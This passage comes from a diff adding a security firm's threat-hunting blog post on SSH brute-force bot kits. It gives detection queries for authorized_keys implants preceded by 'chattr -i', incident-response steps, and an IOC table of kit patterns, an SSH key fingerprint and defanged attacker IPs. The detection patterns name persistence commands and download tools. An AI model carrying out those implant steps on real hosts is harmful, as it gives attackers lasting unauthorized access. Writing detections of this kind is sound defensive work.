+| stats count as sessions sum(eval(if(secs&lt;=20,1,0))) as short dc(user) as users by host src start
+| where short&gt;=5</code></pre>
+
+<h3>D6. Key implant with <code>chattr -i</code> (T1098.004, T1222.002)</h3>
+<p><span class="org orgA">Org A</span> Tested: 4 process records: the two 11 November attempts, each logged as <code>env</code> + <code>python3</code>.</p>
+<pre><code>// A6: authorized_keys append preceded by chattr -i (lock-breaking key implant)
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where ProcessCommandLine has "authorized_keys" and ProcessCommandLine has_any ("chattr -i", "&gt;&gt; authorized_keys", "ssh-rsa ", "ssh-ed25519 ")
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>`comment("B6: Falcon - authorized_keys implant with chattr -i")`
+event_simpleName=ProcessRollup2 event_platform=Lin CommandLine="*authorized_keys*" (CommandLine="*chattr -i*" OR CommandLine="*ssh-rsa *" OR CommandLine="*ssh-ed25519 *")
+| table _time ComputerName UserName FileName CommandLine ParentBaseFileName</code></pre>
+<p>On a real host also watch the file itself: <code>DeviceFileEvents</code> / Falcon <code>FileWritten</code> for <code>*/.ssh/authorized_keys</code> by anything other than your configuration-management agent.</p>
+
+<h2 id="respond">8. When It Fires</h2>
+<ul>
+<li><strong>D1 on a real server</strong> means a bot has a working login and is deciding whether to stay. Assume the next session drops a payload. Lock the account and kill its sessions now. <span class="org orgA">Org A</span> Live Response <code>pkill -KILL -u &lt;user&gt;</code>, then isolate if anything ran after the kit. <span class="org orgB">Org B</span> RTR <code>kill</code> the sessions, or network-contain.</li>
+<li><strong>D2 or D3</strong>: pull every command from the same account in the previous and next 10 minutes (<code>DeviceProcessEvents</code> / <code>ProcessRollup2</code>). Look for <code>wget</code>, <code>curl</code>, <code>chmod +x</code>, writes to <code>/tmp</code>, <code>/dev/shm</code>, <code>~/.ssh/authorized_keys</code>.</li>
+<li><strong>D3 on a host that really has a modem or Telegram Desktop</strong>: treat the Telegram account as compromised (terminate all sessions from another device), and review SMS logs for OTP messages read in the window.</li>
+<li>Whatever fired, find the password: every one of these logins needed one. Rotate it and turn off password authentication on the host.</li>
+</ul>
+
+<h2 id="iocs">9. IOCs</h2>
+<table><thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead><tbody>
+<tr><td>Pattern</td><td><code>check_[0-9a-f]{32}_(small_(control|math|pid|positional|function|done)|transport_done)</code></td><td>Anti-honeypot kit tokens</td></tr>
+<tr><td>Pattern</td><td><code>f_check_[0-9a-f]{32}()</code></td><td>Function test in the same kit</td></tr>
+<tr><td>SSH key</td><td><code>SHA256:sbTUqMHiIZ3gLrJKR2zACW5y9JdUKzEr0XzwF9tgR2I</code></td><td>RSA key in two <code>authorized_keys</code> implant attempts, 11 Nov 14:10 and 19:59 UTC</td></tr>
+<tr><td>String</td><td><code>locate D877F783D5D3EF8Cs</code></td><td>Marker check in the SMS/Telegram kit</td></tr>
+<tr><td>IP (kit)</td><td><code>195.178.110[.]228</code>, <code>2.57.122[.]150</code>, <code>2.57.122[.]209</code>, <code>2.57.122[.]76</code>, <code>2.57.122[.]168</code>, <code>80.94.92[.]55</code>, <code>80.94.92[.]234</code>, <code>92.118.39[.]77</code>, <code>92.118.39[.]49</code></td><td>Anti-honeypot kit, interactive as <code>admin</code></td></tr>
+<tr><td>IP (GPU sizing)</td><td><code>103.159.2[.]113</code>, <code>179.43.153[.]18</code>, <code>2.57.122[.]238</code>, <code>195.178.110[.]26</code>, <code>209.99.190[.]186</code>, <code>79.175.176[.]177</code></td><td>Time-correlated (&le;15 s after the account's logon)</td></tr>
+<tr><td>IP (SMS/Telegram)</td><td><code>191.180.161[.]164</code></td><td>Time-correlated</td></tr>
+<tr><td>Networks</td><td><code>109.160.32[.]0/24</code>, <code>77.239.124[.]0/24</code></td><td>Brute-force workers that confirm hits with <code>uname -s -v -n -r -m</code></td></tr>
+<tr><td>Account names</td><td><code>sol</code>, <code>validator</code>, <code>trading</code>, <code>tradingbot</code></td><td>Crypto-themed targets of the GPU kit. Check none exist with passwords on your hosts.</td></tr>
+<tr><td>ATT&amp;CK</td><td colspan="2">T1110.001, T1078.003, T1021.004, T1497, T1059.004, T1082, T1057, T1120, T1083, T1005, T1222.002, T1098.004</td></tr>
+</tbody></table>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
